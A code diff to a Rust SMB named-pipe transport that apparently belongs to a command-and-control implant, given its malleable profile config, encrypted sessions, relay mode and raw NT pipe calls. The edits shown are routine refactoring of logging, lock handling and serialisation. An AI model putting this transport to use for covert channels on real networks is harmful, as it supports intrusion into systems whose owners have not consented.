@@ -37,13 +37,14 @@
 //! If the pipe is busy when connecting, the transport retries with exponential
 //! back-off (1 s initial, 30 s max, with jitter) up to a configurable limit.
 
+use common::lock::MutexExt;
 use anyhow::{anyhow, Result};
 use async_trait::async_trait;
 use common::config::MalleableProfile;
 use common::{CryptoSession, Message, Transport};
-use log::info;
+use tracing::info;
 #[cfg(windows)]
-use log::warn;
+use tracing::warn;
 #[cfg(windows)]
 use std::time::Duration;
 use tokio::io::{AsyncReadExt, AsyncWriteExt};
@@ -79,7 +80,7 @@ mod nt_pipe {
     const GENERIC_WRITE: u32 = 0x40000000;
 
     /// Build a Windows NT UNICODE_STRING on the stack.
-    unsafe fn init_unicode_string(dest: &mut winapi::shared::ntdef::UNICODE_STRING, s: &[u16]) {
+    unsafe fn init_unicode_string(dest: &mut crate::win_types::UNICODE_STRING, s: &[u16]) {
         dest.Buffer = s.as_ptr() as *mut _;
         dest.Length = (s.len() * 2) as u16;
         dest.MaximumLength = dest.Length;
@@ -99,11 +100,11 @@ mod nt_pipe {
             .chain(std::iter::once(0))
             .collect();
 
-        let mut name_str: winapi::shared::ntdef::UNICODE_STRING = std::mem::zeroed();
+        let mut name_str: crate::win_types::UNICODE_STRING = std::mem::zeroed();
         unsafe { init_unicode_string(&mut name_str, &nt_wide) };
 
-        let mut obj_attrs: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
-        obj_attrs.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
+        let mut obj_attrs: crate::win_types::OBJECT_ATTRIBUTES = std::mem::zeroed();
+        obj_attrs.Length = std::mem::size_of::<crate::win_types::OBJECT_ATTRIBUTES>() as u32;
         obj_attrs.ObjectName = &mut name_str;
         obj_attrs.Attributes = OBJ_CASE_INSENSITIVE;
 
@@ -250,7 +251,7 @@ mod nt_pipe {
 
         /// Read exactly `buf.len()` bytes from the pipe.
         pub fn read_exact(&self, buf: &mut [u8]) -> Result<()> {
-            let handle = *self.handle.lock().unwrap();
+            let handle = *self.handle.lock_recover();
             let mut filled = 0;
             while filled < buf.len() {
                 let n = unsafe { read_file(handle, &mut buf[filled..])? };
@@ -264,7 +265,7 @@ mod nt_pipe {
 
         /// Write all bytes to the pipe.
         pub fn write_all(&self, buf: &[u8]) -> Result<()> {
-            let handle = *self.handle.lock().unwrap();
+            let handle = *self.handle.lock_recover();
             let mut written = 0;
             while written < buf.len() {
                 let n = unsafe { write_file(handle, &buf[written..])? };
@@ -279,7 +280,7 @@ mod nt_pipe {
 
     impl std::io::Read for NtPipeHandle {
         fn read(&mut self, buf: &mut [u8]) -> std::io::Result<usize> {
-            let handle = *self.handle.lock().unwrap();
+            let handle = *self.handle.lock_recover();
             unsafe { read_file(handle, buf) }
                 .map_err(|e| std::io::Error::new(std::io::ErrorKind::Other, e))
         }
@@ -287,7 +288,7 @@ mod nt_pipe {
 
     impl std::io::Write for NtPipeHandle {
         fn write(&mut self, buf: &[u8]) -> std::io::Result<usize> {
-            let handle = *self.handle.lock().unwrap();
+            let handle = *self.handle.lock_recover();
             unsafe { write_file(handle, buf) }
                 .map_err(|e| std::io::Error::new(std::io::ErrorKind::Other, e))
         }
@@ -300,7 +301,7 @@ mod nt_pipe {
 
     impl Drop for NtPipeHandle {
         fn drop(&mut self) {
-            let handle = *self.handle.lock().unwrap();
+            let handle = *self.handle.lock_recover();
             if !handle.is_null() {
                 let _ = unsafe { close_handle(handle) };
             }
@@ -507,7 +508,7 @@ impl Transport for SmbPipeTransport {
             Self::Relay {
                 stream, session, ..
             } => {
-                let plain = bincode::serialize(&msg)?;
+                let plain = bincode::serde::encode_to_vec(&msg, bincode::config::legacy())?;
                 let enc = session.encrypt(&plain);
                 stream.write_u32_le(enc.len() as u32).await?;
                 stream.write_all(&enc).await?;
@@ -515,7 +516,7 @@ impl Transport for SmbPipeTransport {
             }
             #[cfg(windows)]
             Self::Pipe { pipe, session, .. } => {
-                let plain = bincode::serialize(&msg)?;
+                let plain = bincode::serde::encode_to_vec(&msg, bincode::config::legacy())?;
                 let enc = session.encrypt(&plain);
                 let len_bytes = (enc.len() as u32).to_le_bytes();
 
@@ -556,7 +557,7 @@ impl Transport for SmbPipeTransport {
                 let plain = session
                     .decrypt(&buf)
                     .map_err(|e| anyhow!("smb-pipe: decrypt failed: {e:?}"))?;
-                Ok(bincode::deserialize(&plain)?)
+                Ok(bincode::serde::decode_from_slice(&plain, bincode::config::legacy()).map(|(v, _)| v)?)
             }
             #[cfg(windows)]
             Self::Pipe { pipe, session, .. } => {
@@ -589,7 +590,7 @@ impl Transport for SmbPipeTransport {
                 let plain = session
                     .decrypt(&buf)
                     .map_err(|e| anyhow!("smb-pipe: decrypt failed: {e:?}"))?;
-                Ok(bincode::deserialize(&plain)?)
+                Ok(bincode::serde::decode_from_slice(&plain, bincode::config::legacy()).map(|(v, _)| v)?)
             }
         }
     }
